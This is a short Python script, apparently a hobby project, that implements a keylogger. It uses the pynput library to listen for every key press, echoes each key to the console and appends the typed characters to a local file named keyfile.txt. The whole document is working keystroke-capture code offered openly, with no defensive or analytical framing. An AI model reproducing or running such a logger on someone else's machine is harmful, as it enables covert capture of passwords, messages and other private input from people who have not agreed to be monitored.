#author : Nexarque(Swapnil)
#Project Name: Keylogger
#date: 27 august 2025

from pynput import keyboard #this will import the keyboard module from pynput package. 

def keyPressed(key):   #this function will call everytime when you hit any key
    print(str(key))   #this will converts the key into a string and prints on the console 
    with open("keyfile.txt",'a') as logKey: #it create a file in append mode 
        try:
            char = key.char
            logKey.write(char)
        except:
            print("Error Getting Char ")

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)  
    listener.start()    #starts the keyboard listner
    input()